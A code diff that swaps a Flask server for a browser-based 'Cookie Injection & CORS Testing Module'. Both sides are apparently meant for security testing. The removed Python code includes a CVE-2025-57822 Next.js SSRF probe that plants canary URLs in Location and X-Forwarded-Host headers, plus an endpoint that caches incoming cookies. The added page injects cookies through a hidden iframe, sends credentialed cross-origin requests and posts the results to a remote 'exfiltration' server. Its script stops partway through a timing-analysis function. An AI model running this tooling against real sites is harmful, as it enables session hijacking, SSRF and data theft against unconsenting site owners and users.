@@ -1,1110 +1,635 @@
-from flask import Flask, request, jsonify, send_from_directory
-from flask_cors import CORS
-import os, time, json, requests
-import uuid
-from datetime import datetime
-from urllib.parse import urljoin, urlparse
+<!doctype html>
+<meta charset="utf-8" />
+<title>Enhanced Cookie Injection & CORS Testing Module</title>
+<style>
+  body { font-family: system-ui, sans-serif; margin: 1rem; background: #0a0e1a; color: #d6ffe6; }
+  .section { background: #131823; padding: 16px; margin: 12px 0; border-radius: 8px; border: 1px solid #1e2837; }
+  .section h3 { margin-top: 0; color: #6ee7b7; }
+  input, button, select, textarea { font-size: 14px; margin: 4px; padding: 8px 12px; background: #1e2837; color: #d6ffe6; border: 1px solid #2d3748; border-radius: 4px; }
+  button { cursor: pointer; background: #1e3a5f; transition: all 0.2s; }
+  button:hover:not(:disabled) { background: #2563eb; }
+  button:disabled { opacity: 0.5; cursor: not-allowed; }
+  #out { white-space: pre-wrap; background: #0b1020; color: #d6ffe6; padding: 12px; border-radius: 6px; min-height: 300px; margin-top: 10px; font-family: 'Courier New', monospace; font-size: 13px; max-height: 600px; overflow-y: auto; }
+  .row { margin: 8px 0; display: flex; align-items: center; gap: 8px; flex-wrap: wrap; }
+  label { color: #a5b4fc; }
+  .success { color: #6ee7b7; }
+  .error { color: #fca5a5; }
+  .warning { color: #fcd34d; }
+  .status-badge { padding: 2px 6px; border-radius: 4px; font-weight: bold; }
+  .status-success { background:#1a7f37; }
+  .status-error   { background:#b00020; }
+  .status-warning { background:#b45309; }
+  .status-info    { background:#1e40af; }
+</style>
 
-app = Flask(__name__)
-CORS(app, resources={r"/*": {"origins": "*"}}, supports_credentials=True)
+<h1>Enhanced Cookie Injection & CORS Testing Module</h1>
 
-# ============================================================================
-# n8n CONFIGURATION - UPDATE THESE!
-# ============================================================================
-# Get your production webhook URL from n8n:
-# 1. Activate your workflow (toggle from listening → active)
-# 2. Copy the "Production URL" from the webhook node
-# 3. It should look like: http://localhost:5678/webhook/YOUR-UUID
+<!-- Target Config -->
+<div class="section">
+<h3>Target Configuration</h3>
+<div class="row"><label>Target Origin:</label><input id="target" value="https://portal.playground.example.com" size="50"></div>
+<div class="row"><label>Target Path:</label><input id="path" value="/api/protected" size="40"></div>
+<div class="row"><label>Cookie Name to Inject:</label><input id="cookieName" value="session" size="30"></div>
+<div class="row"><label>Cookie Value:</label><input id="cookieValue" value="INJECTED_VALUE" size="40"></div>
+</div>
 
-N8N_CANARY_WEBHOOK = "http://localhost:5678/webhook-test/cookie-capture"  # UPDATE THIS!
-N8N_QUERY_WEBHOOK = "http://localhost:5678/webhook-test/check-hits"    # UPDATE THIS!
+<!-- Server Config -->
+<div class="section">
+<h3>Server Configuration (ngrok)</h3>
+<div class="row"><label>Your ngrok/Server URL:</label><input id="serverUrl" value="http://localhost:3000" size="50"></div>
+<div class="row"><label>Evidence endpoint (relative):</label><input id="evidenceEndpoint" value="/collect-evidence" size="30"></div>
+<div class="row"><button id="testServer" class="secondary">Test Server Connection</button></div>
+<div class="row"><label><input type="checkbox" id="autoExfil" checked /> Auto-send results to server</label></div>
+</div>
 
-# In-memory storage as fallback (if n8n query fails)
-canary_hits = {}
-cookie_cache = {}
+<!-- Attack Methods -->
+<div class="section">
+<h3>Attack Methods</h3>
+<div class="row">
+<button id="basicInjection">Basic Cookie Injection</button>
+<button id="advancedInjection">Multi-Vector Injection</button>
+<button id="timingAttack">Timing Analysis</button>
+</div>
+<div class="row">
+<button id="csrfTest" class="danger">CSRF Test</button>
+<button id="batchTest">Batch Scanner</button>
+<button id="proxyFetch">Use Server Proxy (Bypass CORS)</button>
+<button id="directCorsTest">Direct CORS Test (credentials)</button>
+<button id="automatedExfil">Full Attack Chain</button>
+</div>
+</div>
 
-def generate_canary_url(test_id=None):
-    """Generate unique canary URL with test identifier"""
-    if not test_id:
-        test_id = str(uuid.uuid4())[:8]
-    
-    # Append test_id as query parameter
-    canary_url = f"{N8N_QUERY_WEBHOOK}?test_id={test_id}&ts={int(time.time())}"
-    
-    # Initialize hit tracking
-    canary_hits[test_id] = {
-        'hits': [],
-        'created_at': time.time()
+<!-- Advanced Options -->
+<div class="section">
+<h3>Advanced Options</h3>
+<div class="row">
+<label>HTTP Method:</label>
+<select id="method">
+<option>GET</option><option selected>POST</option><option>PUT</option><option>PATCH</option><option>DELETE</option>
+</select>
+</div>
+<div class="row">
+<label>Request Body (JSON):</label>
+<textarea id="body" rows="2" cols="60">{"action": "test", "timestamp": "${Date.now()}"}</textarea>
+</div>
+<div class="row">
+<label><input type="checkbox" id="cleanupCookies" checked /> Cleanup cookies after test</label>
+</div>
+</div>
+
+<!-- Manual Cookie -->
+<div class="section">
+<h3>Manual Cookie Management</h3>
+<div class="row">
+<label>Cookie Name:</label><input id="manualCookieName" value="test_cookie" size="20">
+<label>Value:</label><input id="manualCookieValue" value="test_value" size="30">
+<button id="setCookieBtn">Set Cookie</button>
+<button id="showCookiesBtn" class="secondary">Show All Cookies</button>
+</div>
+</div>
+
+<!-- Investigator Notes -->
+<div class="section">
+<h3>Investigator Notes</h3>
+<div class="row"><textarea id="notes" rows="4" style="width: 100%; font-family: inherit;" placeholder="Write your observations, findings, timestamps here..."></textarea></div>
+<div class="row">
+<button id="sendNotes">Send Notes to Server</button>
+<button id="clearNotes" class="secondary">Clear Notes</button>
+<span id="notesStatus" style="margin-left: 12px;"></span>
+</div>
+</div>
+
+<!-- Output & Evidence -->
+<div class="section">
+<h3>Output & Evidence</h3>
+<div class="row">
+<button id="clearLog" class="secondary">Clear Log</button>
+<button id="downloadEvidence">Download Evidence</button>
+<button id="copyResults">Copy to Clipboard</button>
+<span id="status" style="margin-left: 12px;"></span>
+</div>
+<div id="out"></div>
+</div>
+
+<script>
+// ---------------------------------------------------------------------------
+// Utility functions
+// ---------------------------------------------------------------------------
+function getServerUrl() { return document.getElementById('serverUrl').value.trim(); }
+
+function setStatus(msg, type = 'info') {
+  const badge = document.createElement('span');
+  badge.className = `status-badge status-${type}`;
+  badge.textContent = msg;
+  const status = document.getElementById('status');
+  status.innerHTML = '';
+  status.appendChild(badge);
+  setTimeout(() => status.innerHTML = '', 5000);
+}
+
+function setNotesStatus(msg, error = false) {
+  const el = document.getElementById('notesStatus');
+  el.textContent = msg;
+  el.style.color = error ? '#b00020' : '#1a7f37';
+}
+
+function log(msg, level = 'info') {
+  const timestamp = new Date().toISOString();
+  const prefix = { success:'OK', error:'ERROR', warning:'WARNING', info:'INFO' }[level] || '•';
+  const line = `[${timestamp}] ${prefix} ${msg}`;
+  const out = document.getElementById('out');
+  const span = document.createElement('span');
+  span.className = level;
+  span.textContent = line + '\n';
+  out.appendChild(span);
+  out.scrollTop = out.scrollHeight;
+}
+
+function hr() { log('─'.repeat(80)); }
+
+function clear() {
+  document.getElementById('out').textContent = '';
+  logBuffer = [];
+  testResults = [];
+}
+
+// ---------------------------------------------------------------------------
+// Logging buffers
+// ---------------------------------------------------------------------------
+let logBuffer = [];
+let testResults = [];
+
+// ---------------------------------------------------------------------------
+// Helper to build config object
+// ---------------------------------------------------------------------------
+function getConfig(override = {}) {
+  const bodyVal = document.getElementById('body').value;
+  return {
+    target: document.getElementById('target').value.trim(),
+    path:   document.getElementById('path').value.trim(),
+    cookieName: document.getElementById('cookieName').value.trim(),
+    cookieValue: document.getElementById('cookieValue').value.trim(),
+    method: document.getElementById('method').value,
+    body: bodyVal.includes('${Date.now()}') ? bodyVal.replace('${Date.now()}', Date.now()) : bodyVal,
+    cleanup: document.getElementById('cleanupCookies').checked,
+    ...override
+  };
+}
+
+// ---------------------------------------------------------------------------
+// SERVER TEST
+// ---------------------------------------------------------------------------
+document.getElementById('testServer').onclick = async () => {
+  const url = getServerUrl();
+  try {
+    const res = await fetch(url + '/health');
+    if (res.ok) {
+      const data = await res.json();
+      log('Server reachable!', 'success');
+      log('Response: ' + JSON.stringify(data), 'info');
+      setStatus('Connected', 'success');
+    } else {
+      log(`Server responded ${res.status}`, 'warning');
+      setStatus('Issue', 'warning');
     }
-    
-    return canary_url, test_id
+  } catch (e) {
+    log(`Cannot reach server: ${e.message}`, 'error');
+    setStatus('Not connected', 'error');
+  }
+};
 
-def test_n8n_connectivity():
-    """Test if n8n webhooks are active and responding"""
-    print("\n" + "="*70)
-    print("Testing n8n connectivity...")
-    print("="*70)
-    
-    # Test canary webhook
-    try:
-        test_id = "connectivity-test"
-        print(f"→ Testing canary: {N8N_QUERY_WEBHOOK}")
-        resp = requests.get(
-            N8N_QUERY_WEBHOOK,
-            params={'test_id': test_id},
-            timeout=5
-        )
-        if resp.ok:
-            print(f"  ✓ Canary webhook is ACTIVE and responding")
-            print(f"    Response: {resp.json()}")
-        else:
-            print(f"  ✗ Canary returned status {resp.status_code}")
-    except requests.exceptions.ConnectionError:
-        print(f"  ✗ Cannot connect to canary webhook")
-        print(f"    Make sure n8n is running and workflow is ACTIVE (green toggle)")
-    except Exception as e:
-        print(f"  ✗ Error: {e}")
-    
-    # Test query webhook
-    try:
-        print(f"→ Testing query: {N8N_QUERY_WEBHOOK}")
-        resp = requests.get(
-            N8N_QUERY_WEBHOOK,
-            params={'test_id': test_id},
-            timeout=5
-        )
-        if resp.ok:
-            print(f"  ✓ Query webhook is ACTIVE and responding")
-            data = resp.json()
-            print(f"    Hit count: {data.get('hit_count', 0)}")
-        else:
-            print(f"  ✗ Query returned status {resp.status_code}")
-    except requests.exceptions.ConnectionError:
-        print(f"  ✗ Cannot connect to query webhook")
-        print(f"    Make sure n8n is running and workflow is ACTIVE (green toggle)")
-    except Exception as e:
-        print(f"  ✗ Error: {e}")
-    
-    print("="*70 + "\n")
+// ---------------------------------------------------------------------------
+// EXFILTRATION TO SERVER
+// ---------------------------------------------------------------------------
+async function exfiltrateToServer(data) {
+  const server = getServerUrl();
+  const endpoint = server + document.getElementById('evidenceEndpoint').value;
+  log(`Exfiltrating to ${endpoint}`, 'info');
 
-def check_n8n_canary_hits(test_id, wait_time=3):
-    """
-    Query n8n to check if canary URL was hit
-    
-    Args:
-        test_id: Unique identifier for this test
-        wait_time: Seconds to wait before checking (for SSRF to complete)
-    
-    Returns:
-        dict with hit count and details
-    """
-    print(f"⏳ Waiting {wait_time}s for potential SSRF callback...")
-    time.sleep(wait_time)
-    
-    result = {
-        'hitTotal': 0,
-        'uniqueIPs': 0,
-        'hits': [],
-        'timestamps': [],
-        'method': 'n8n_query',
-        'n8n_status': None
-    }
-    
-    try:
-        # Try querying n8n workflow
-        print(f"🔍 Querying n8n webhook: {N8N_QUERY_WEBHOOK}?test_id={test_id}")
-        
-        response = requests.get(
-            N8N_QUERY_WEBHOOK,
-            params={'test_id': test_id},
-            timeout=10
-        )
-        
-        result['n8n_status'] = response.status_code
-        
-        if response.ok:
-            data = response.json()
-            result.update({
-                'hitTotal': data.get('hit_count', 0),
-                'uniqueIPs': len(data.get('unique_ips', [])),
-                'hits': data.get('hits', []),
-                'timestamps': data.get('timestamps', []),
-                'method': 'n8n_query_success',
-                'n8n_response': data
-            })
-            print(f"✓ n8n query successful: {result['hitTotal']} hit(s)")
-            return result
-        else:
-            print(f"⚠ n8n query failed with status {response.status_code}")
-            print(f"   Response: {response.text[:200]}")
-            result['n8n_error'] = response.text[:200]
-            
-    except requests.exceptions.ConnectionError as e:
-        print(f"⚠ Cannot connect to n8n at {N8N_QUERY_WEBHOOK}")
-        print(f"   Error: {e}")
-        print(f"   SOLUTION: Make sure n8n workflow is ACTIVE (green toggle in top-right)")
-        print(f"   The workflow must be in production mode, not 'listening for test event'")
-        result['n8n_error'] = 'Connection refused - n8n may not be active'
-    except Exception as e:
-        print(f"⚠ Error querying n8n: {e}")
-        result['n8n_error'] = str(e)
-    
-    # Fallback: Check in-memory storage
-    if test_id in canary_hits:
-        hits = canary_hits[test_id]['hits']
-        unique_ips = list(set([h.get('ip', 'unknown') for h in hits]))
-        result.update({
-            'hitTotal': len(hits),
-            'uniqueIPs': len(unique_ips),
-            'hits': hits,
-            'timestamps': [h.get('timestamp') for h in hits],
-            'method': 'fallback_memory'
-        })
-        print(f"✓ Fallback check: {result['hitTotal']} hit(s) in memory")
-    else:
-        print(f"⚠ No hits found in fallback memory either")
-    
-    return result
-
-@app.route('/set')
-def set_session():
-    resp = make_response(jsonify({"status":"ok"}))
-    resp.set_cookie('session', 'secret', httponly=True, secure=True, samesite='Lax', path='/')
-    return resp
-
-# ============================================================================
-# FALLBACK CANARY ENDPOINT (if n8n fails)
-# ============================================================================
-@app.route('/canary', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'])
-def fallback_canary():
-    """Fallback canary endpoint in case n8n isn't available"""
-    test_id = request.args.get('test_id', 'unknown')
-    
-    hit_data = {
-        'test_id': test_id,
-        'timestamp': datetime.utcnow().isoformat(),
-        'ip': request.headers.get('X-Forwarded-For', request.remote_addr),
-        'user_agent': request.headers.get('User-Agent', ''),
-        'method': request.method,
-        'path': request.path,
-        'full_url': request.url,
-        'headers': dict(request.headers)
-    }
-    
-    # Store in memory
-    if test_id not in canary_hits:
-        canary_hits[test_id] = {'hits': [], 'created_at': time.time()}
-    
-    canary_hits[test_id]['hits'].append(hit_data)
-    
-    print(f"\n🎯 CANARY HIT DETECTED!")
-    print(f"   Test ID: {test_id}")
-    print(f"   IP: {hit_data['ip']}")
-    print(f"   User-Agent: {hit_data['user_agent']}")
-    print(f"   Method: {hit_data['method']}\n")
-    
-    return jsonify({'status': 'logged', 'test_id': test_id})
-
-# ============================================================================
-# MAIN ENDPOINTS
-# ============================================================================
-
-@app.route('/proxy/get-cookies', methods=['POST'])
-def proxy_get_cookies():
-    data = request.get_json(force=True)
-    target_origin = data.get('targetOrigin')
-    path = data.get('path', '/')
-    method = data.get('method', 'GET')
-
-    if not target_origin:
-        return jsonify({'ok': False, 'error': 'targetOrigin required'}), 400
-
-    try:
-        target_url = target_origin.rstrip('/') + path
-        r = requests.request(method, target_url, allow_redirects=False, timeout=15)
-
-        # Get raw Set-Cookie headers
-        raw_setcookie_list = []
-        if hasattr(r.headers, 'getlist'):
-            raw_setcookie_list = r.headers.getlist('Set-Cookie')
-        else:
-            for k, v in r.headers.items():
-                if k.lower() == 'set-cookie':
-                    raw_setcookie_list.append(v)
-
-        parsed_cookies = [{'name': c.name, 'value': c.value} for c in r.cookies]
-
-        return jsonify({
-            'ok': True,
-            'status': r.status_code,
-            'raw_setcookie': raw_setcookie_list,
-            'cookies': parsed_cookies,
-            'headers': dict(r.headers)
-        })
-
-    except Exception as e:
-        return jsonify({'ok': False, 'error': str(e)}), 500
-
-@app.route('/test-n8n', methods=['GET'])
-def test_n8n_endpoint():
-    """Endpoint to test n8n connectivity from browser"""
-    test_n8n_connectivity()
-    
-    # Try to hit canary and query it
-    test_id = f"test-{int(time.time())}"
-    
-    results = {
-        'test_id': test_id,
-        'canary_hit': False,
-        'canary_response': None,
-        'query_response': None,
-        'errors': []
-    }
-    
-    # Hit canary
-    try:
-        resp = requests.get(
-            N8N_QUERY_WEBHOOK,
-            params={'test_id': test_id},
-            timeout=5
-        )
-        if resp.ok:
-            results['canary_hit'] = True
-            results['canary_response'] = resp.json()
-    except Exception as e:
-        results['errors'].append(f"Canary error: {e}")
-    
-    # Wait and query
-    time.sleep(2)
-    try:
-        resp = requests.get(
-            N8N_QUERY_WEBHOOK,
-            params={'test_id': test_id},
-            timeout=5
-        )
-        if resp.ok:
-            results['query_response'] = resp.json()
-    except Exception as e:
-        results['errors'].append(f"Query error: {e}")
-    
-    return jsonify(results)
-
-@app.route('/log-headers', methods=['POST'])
-def log_headers():
-    cookie_header = request.headers.get('Cookie')
-    if cookie_header:
-        # Parse cookies
-        cookies = {}
-        for c in cookie_header.split(';'):
-            c = c.strip()
-            if '=' in c:
-                name, value = c.split('=', 1)
-                cookies[name] = value
-        # Store in cache
-        for name, value in cookies.items():
-            cookie_cache[name] = value
-    return jsonify({'status': 'stored', 'cookies': list(cookies.keys())})
-
-@app.route("/")
-def index():
-    return send_from_directory(".", "cors_poc_2.html")
-
-@app.route('/probe', methods=['POST'])
-def probe_endpoint():
-    data = request.get_json(force=True)
-    target_origin = data.get('targetOrigin')
-    path = data.get('path', '/')
-    method = data.get('method', 'GET')
-    redact = bool(data.get('redact_cookie_values', True))
-
-    if not target_origin:
-        return jsonify({"ok": False, "error": "targetOrigin required"}), 400
-
-    target_url = urljoin(target_origin, path)
-
-    # Preflight attempt (optional)
-    preflight = {}
-    try:
-        pre = requests.options(target_url, headers={"Origin": data.get('attackOrigin', 'https://example.com')}, timeout=6)
-        preflight = {"status": pre.status_code, "headers": dict(pre.headers)}
-    except Exception as e:
-        preflight = {"error": str(e)}
-
-    # perform actual fetch server->target
-    res = fetch_target_redacted(target_url, method=method, redact_cookie_values=redact)
-
-    # prepare redacted actual output
-    actual_redacted = {
-        "status": res.get('status'),
-        "response_headers_summary": {k: v for k, v in (res.get('response_headers') or {}).items() if k.lower().startswith('access-control-') or k.lower().startswith('content-') or k.lower().startswith('server') or k.lower().startswith('set-cookie')},
-        "set_cookie_count": res.get('set_cookie_count'),
-        "set_cookie_names": res.get('set_cookie_names'),
-        "body_preview": res.get('body_preview')
-    }
-
-    payload = {
-        "preflight": preflight,
-        "actual_redacted": actual_redacted
-    }
-
-    # If caller explicitly asked for non-redacted values and server allows, include them
-    if (not redact) and os.environ.get("ALLOW_RAW_COOKIE_VALUES") == "1":
-        payload["actual"] = res  # careful: may include raw cookie strings
-
-    return jsonify(payload)
-
-# /notes endpoint — append to local file
-@app.route('/notes', methods=['POST'])
-def notes_endpoint():
-    try:
-        data = request.get_json(force=True)
-    except:
-        return jsonify({"ok": False, "error": "invalid json"}), 400
-
-    record = {
-        "timestamp": data.get('timestamp') or time.time(),
-        "target": data.get('target'),
-        "notes": data.get('notes'),
-        "user_agent": data.get('user_agent') or request.headers.get('User-Agent'),
-        "ip": request.remote_addr
-    }
-    try:
-        with open(NOTES_FILE, 'a', encoding='utf-8') as fh:
-            fh.write(json.dumps(record, ensure_ascii=False) + '\n')
-    except Exception as e:
-        return jsonify({"ok": False, "error": str(e)}), 500
-
-    return jsonify({"ok": True, "saved_file": NOTES_FILE})
-
-@app.route('/probe-nextjs-cve-2025-57822', methods=['POST'])
-def probe_nextjs_cve():
-    """
-    Enhanced Next.js CVE-2025-57822 SSRF probe with n8n canary integration
-    """
-    data = request.get_json(force=True)
-    target_origin = data.get('targetOrigin', '')
-    test_paths = data.get('testPaths', ['/'])
-    
-    if not target_origin:
-        return jsonify({'error': 'targetOrigin required'}), 400
-    
-    # Generate unique canary URL for this test
-    canary_url, test_id = generate_canary_url()
-    
-    results = {
-        'targetOrigin': target_origin,
-        'testId': test_id,
-        'timestamp': datetime.utcnow().isoformat(),
-        'vulnerable': False,
-        'hasMiddleware': False,
-        'version': None,
-        'tests': [],
-        'canary': {
-            'url': canary_url,
-            'testId': test_id,
-            'hitTotal': 0,
-            'uniqueIPs': 0,
-            'hits': []
+  try {
+    const res = await fetch(endpoint, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        type: 'cookie_injection_evidence',
+        timestamp: new Date().toISOString(),
+        data: data,
+        metadata: {
+          userAgent: navigator.userAgent,
+          origin: window.location.origin,
+          testCount: testResults.length
         }
+      })
+    });
+
+    if (res.ok) {
+      const json = await res.json();
+      log(`Evidence stored (ID: ${json.evidence_id || '—'})`, 'success');
+      return true;
+    } else {
+      const txt = await res.text();
+      log(`Server error ${res.status}: ${txt}`, 'error');
+      return false;
     }
-    
-    print(f"\n{'='*70}")
-    print(f"CVE-2025-57822 SSRF Probe Started")
-    print(f"{'='*70}")
-    print(f"Test ID: {test_id}")
-    print(f"Target: {target_origin}")
-    print(f"Canary: {canary_url}")
-    print(f"{'='*70}\n")
-    
-    for path in test_paths:
-        test_url = target_origin.rstrip('/') + path
-        
-        # Test 1: Detect middleware presence
-        try:
-            print(f"Testing: {test_url}")
-            r1 = requests.get(
-                test_url,
-                headers={'User-Agent': f'CVE-2025-57822-Scanner/{test_id}'},
-                timeout=10,
-                allow_redirects=False
-            )
-            
-            middleware_headers = [
-                'x-middleware-preflight',
-                'x-middleware-rewrite',
-                'x-nextjs-matched-path',
-                'x-middleware-next'
-            ]
-            
-            if any(h.lower() in [k.lower() for k in r1.headers.keys()] for h in middleware_headers):
-                results['hasMiddleware'] = True
-                print(f"  ✓ Middleware detected")
-            
-            if 'x-powered-by' in r1.headers:
-                powered_by = r1.headers['x-powered-by']
-                if 'Next.js' in powered_by:
-                    results['version'] = powered_by
-                    print(f"  ✓ Version: {powered_by}")
-            
-        except Exception as e:
-            print(f"  ✗ Error: {e}")
-            continue
-        
-        # Test 2: SSRF with Location header injection
-        try:
-            print(f"  → Attempting SSRF with Location: {canary_url}")
-            r2 = requests.post(
-                test_url,
-                headers={
-                    'Content-Type': 'application/json',
-                    'Location': canary_url,
-                    'User-Agent': f'CVE-2025-57822-SSRF/{test_id}'
-                },
-                json={'test': 'ssrf', 'test_id': test_id},
-                timeout=10,
-                allow_redirects=False
-            )
-            
-            test_result = {
-                'path': path,
-                'method': 'POST',
-                'status': r2.status_code,
-                'vulnerable': False,
-                'details': None
+  } catch (e) {
+    log(`Exfil failed: ${e.message}`, 'error');
+    return false;
+  }
+}
+
+// ---------------------------------------------------------------------------
+// COOKIE INJECTION ENGINE
+// ---------------------------------------------------------------------------
+async function cookieInjectionAttack(config) {
+  const {
+    target, path = '/', cookieName, cookieValue,
+    method = 'POST', body = null, timeout = 5000,
+    cleanup = true, vectors = ['standard']
+  } = config;
+
+  const url = new URL(path, target);
+  const domain = url.hostname;
+  const targetPath = url.pathname;
+
+  log(`Starting injection on ${url.href}`, 'info');
+  log(`Cookie: ${cookieName}=${cookieValue.substring(0,20)}...`);
+
+  const result = {
+    target: url.href,
+    timestamp: new Date().toISOString(),
+    cookieName,
+    success: false,
+    vectors: [],
+    response: null,
+    timing: {},
+    error: null
+  };
+
+  return new Promise((resolve) => {
+    const iframe = document.createElement('iframe');
+    iframe.src = url.href;
+    iframe.style.display = 'none';
+    iframe.setAttribute('sandbox', 'allow-same-origin allow-scripts');
+
+    const timeoutId = setTimeout(() => {
+      cleanupIframe();
+      result.error = 'Timeout';
+      log(`Timed out after ${timeout}ms`, 'warning');
+      resolve(result);
+    }, timeout);
+
+    const cleanupIframe = () => {
+      clearTimeout(timeoutId);
+      if (iframe.parentNode) document.body.removeChild(iframe);
+      if (cleanup) {
+        ['=', ';'].forEach(sep => {
+          try { document.cookie = `${cookieName}${sep}; domain=${domain}; path=${targetPath}; expires=Thu, 01 Jan 1970 00:00:00 GMT`; } catch (_) {}
+        });
+      }
+    };
+
+    iframe.onload = async () => {
+      const start = performance.now();
+      try {
+        // ---- Injection vectors ----
+        const inj = {
+          standard: `${cookieName}=${cookieValue}; domain=${domain}; path=${targetPath}`,
+          quoted: `${cookieName}="${cookieValue}"; domain=${domain}; path=${targetPath}`,
+          version: `$Version=1; ${cookieName}=${cookieValue}; domain=${domain}; path=${targetPath}`,
+          dummy: `dummy=qaz"; domain=${domain}; path=/`
+        };
+        vectors.forEach(v => {
+          if (inj[v]) {
+            try {
+              document.cookie = inj[v];
+              result.vectors.push({ name: v, cookie: inj[v], success: true });
+              log(`Injected via ${v}`, 'success');
+            } catch (e) {
+              result.vectors.push({ name: v, success: false, error: e.message });
+              log(`Failed ${v}: ${e.message}`, 'error');
             }
-            
-            if 300 <= r2.status_code < 400:
-                test_result['vulnerable'] = True
-                test_result['details'] = f"Redirect response ({r2.status_code})"
-                results['vulnerable'] = True
-                print(f"  ⚠ Redirect detected: {r2.status_code}")
-            
-            if 'location' in r2.headers:
-                returned_location = r2.headers['location']
-                if canary_url in returned_location or test_id in returned_location:
-                    test_result['vulnerable'] = True
-                    test_result['details'] = "Canary URL reflected in Location header"
-                    results['vulnerable'] = True
-                    print(f"  🚨 Canary URL reflected!")
-            
-            results['tests'].append(test_result)
-            
-        except Exception as e:
-            print(f"  ✗ SSRF test error: {e}")
-            results['tests'].append({
-                'path': path,
-                'method': 'POST',
-                'status': 'error',
-                'vulnerable': False,
-                'details': str(e)
-            })
-        
-        # Test 3: Various redirect methods
-        for status_code in [301, 302, 307, 308]:
-            try:
-                r3 = requests.get(
-                    test_url,
-                    headers={
-                        'Location': canary_url,
-                        'X-Forwarded-Host': urlparse(canary_url).netloc,
-                        'User-Agent': f'CVE-2025-57822-{status_code}/{test_id}'
-                    },
-                    timeout=5,
-                    allow_redirects=False
-                )
-                
-                if 'location' in r3.headers and (canary_url in r3.headers['location'] or test_id in r3.headers['location']):
-                    results['tests'].append({
-                        'path': path,
-                        'method': f'GET (injected {status_code})',
-                        'status': r3.status_code,
-                        'vulnerable': True,
-                        'details': 'Canary reflected in Location'
-                    })
-                    results['vulnerable'] = True
-                    print(f"  🚨 Canary reflected with status {status_code}!")
-                    
-            except Exception as e:
-                continue
-    
-    # Check canary hits via n8n (or fallback)
-    print(f"\n{'='*70}")
-    canary_results = check_n8n_canary_hits(test_id, wait_time=3)
-    results['canary'].update(canary_results)
-    
-    if canary_results['hitTotal'] > 0:
-        print(f"🎯 SSRF CONFIRMED!")
-        print(f"   Canary received {canary_results['hitTotal']} hit(s)")
-        print(f"   From {canary_results['uniqueIPs']} unique IP(s)")
-        print(f"   Detection method: {canary_results['method']}")
-        results['vulnerable'] = True
-        
-        # Show hit details
-        for i, hit in enumerate(canary_results['hits'][:3], 1):  # Show first 3
-            print(f"   Hit #{i}: {hit.get('ip')} at {hit.get('timestamp')}")
-    else:
-        print(f"⚠ No canary hits detected")
-        print(f"   This doesn't rule out vulnerability - target may have:")
-        print(f"   - Network restrictions preventing outbound requests")
-        print(f"   - WAF/firewall blocking the SSRF attempt")
-        print(f"   - Different vulnerable paths not tested")
-    
-    print(f"{'='*70}")
-    print(f"Probe Complete - Vulnerable: {results['vulnerable']}")
-    print(f"{'='*70}\n")
-    
-    return jsonify(results)
+          }
+        });
 
-NOTES_FILE = 'notes.log'   # appends JSON lines
+        await new Promise(r => setTimeout(r, 100));
+        result.timing.injection = performance.now() - start;
 
-def fetch_target_redacted(url, method='GET', headers=None, data=None, redact_cookie_values=True):
-    """Perform server->target request, capture headers and cookie names.
-       If redact_cookie_values==False and SERVER_ALLOW_RAW is True, include actual values.
-    """
-    try:
-        r = requests.request(method, url, headers=headers or {}, data=data, timeout=10, allow_redirects=True)
-    except Exception as e:
-        return {"ok": False, "error": str(e)}
+        // ---- Request with credentials ----
+        const fetchStart = performance.now();
+        const opts = {
+          method,
+          credentials: 'include',
+          mode: 'cors',
+          headers: { 'Content-Type': 'application/json' }
+        };
+        if (body && method !== 'GET') opts.body = typeof body === 'string' ? body : JSON.stringify(body);
 
-    # collect headers
-    resp_headers = dict(r.headers)
+        const resp = await fetch(url.href, opts);
+        result.timing.request = performance.now() - fetchStart;
+        result.timing.total = performance.now() - start;
 
-    # collect set-cookie header(s)
-    set_cookie_raw = r.headers.get('Set-Cookie')
-    set_cookie_list = []
-    if set_cookie_raw:
-        # Many frameworks return a single header string; split conservatively by comma if multiple cookies present
-        # but be cautious (cookie values can contain commas); for triage this is OK.
-        set_cookie_list = [s.strip() for s in set_cookie_raw.split(',') if s.strip()]
+        result.response = {
+          status: resp.status,
+          statusText: resp.statusText,
+          headers: {},
+          corsHeaders: {}
+        };
+        resp.headers.forEach((v, k) => {
+          result.response.headers[k] = v;
+          if (k.toLowerCase().includes('access-control')) result.response.corsHeaders[k] = v;
+        });
 
-    # parse cookie names
-    cookie_names = []
-    for sc in set_cookie_list:
-        # extract cookie-name up to the first "="
-        try:
-            name = sc.split('=')[0].strip()
-            cookie_names.append(name)
-        except:
-            pass
+        try {
+          const ct = resp.headers.get('content-type') || '';
+          result.response.body = ct.includes('json') ? await resp.json() : await resp.text();
+        } catch (e) { result.response.bodyError = e.message; }
 
-    body_preview = r.text[:2000] if r.text else ''
+        result.success = true;
+        log(`Request ${resp.status} ${resp.statusText}`, 'success');
+      } catch (err) {
+        result.error = err.message;
+        if (err.message.includes('CORS') || err.name === 'TypeError') {
+          log('CORS blocked (expected for misconfig demo)', 'warning');
+        } else {
+          log(`Request error: ${err.message}`, 'error');
+        }
+      } finally {
+        cleanupIframe();
+        testResults.push(result);
+        resolve(result);
+      }
+    };
 
-    result = {
-        "ok": True,
-        "status": r.status_code,
-        "response_headers": resp_headers,
-        "set_cookie_count": len(set_cookie_list),
-        "set_cookie_names": cookie_names,
-        "body_preview": body_preview
+    iframe.onerror = () => {
+      cleanupIframe();
+      result.error = 'Iframe load failed';
+      log('Iframe error', 'error');
+      resolve(result);
+    };
+
+    document.body.appendChild(iframe);
+  });
+}
+
+// ---------------------------------------------------------------------------
+// TIMING ATTACK
+// ---------------------------------------------------------------------------
+async function timingAttackAnalysis(config) {
+  log('Starting timing analysis...', 'info');
+  const runs = 5;
+  const results = { authenticated: [], unauthenticated: [] };
+
+  for (let i = 0; i < runs; i++) {
+    log(`Auth run ${i+1}/${runs}`);
+    const r = await cookieInjectionAttack({ ...config, cleanup: i === runs-1 });
+    if (r.timing?.request) results.authenticated.push(r.timing.request);
+    await new Promise(r => setTimeout(r, 500));
+  }
+
+  for (let i = 0; i < runs; i++) {
+    log(`Unauth run ${i+1}/${runs}`);
+    const start = performance.now();
+    try { await fetch(config.target + config.path, { method: config.method, credentials: 'omit', mode: 'cors' }); } catch (_) {}
+    results.unauthenticated.push(performance.now() - start);
+    await new Promise(r => setTimeout(r, 500));
+  }
+
+  const avg = a => a.reduce((s,v)=>s+v,0)/a.length;
+  const std = a => { const m = avg(a); return Math.sqrt(a.reduce((s,v)=>s+Math.pow(v-m,2),0)/a.length); };
+  const aAvg = avg(results.authenticated), uAvg = avg(results.unauthenticated);
